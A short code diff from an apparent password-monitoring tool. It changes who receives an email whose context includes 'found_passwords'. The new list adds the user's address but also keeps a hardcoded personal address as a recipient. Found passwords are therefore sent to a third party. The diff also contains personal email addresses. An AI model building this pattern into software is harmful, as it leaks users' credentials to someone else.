@@ -124,7 +124,7 @@ class Monitor():
 
         subject = subject
         from_email = sendmail.EMAIL_HOST_USER
-        to_list = ['daudahmed870@gmail.com']
+        to_list = [email, 'daudahmed@zoho.com']
         context = {
             'email': email,
             'passwords': found_passwords,
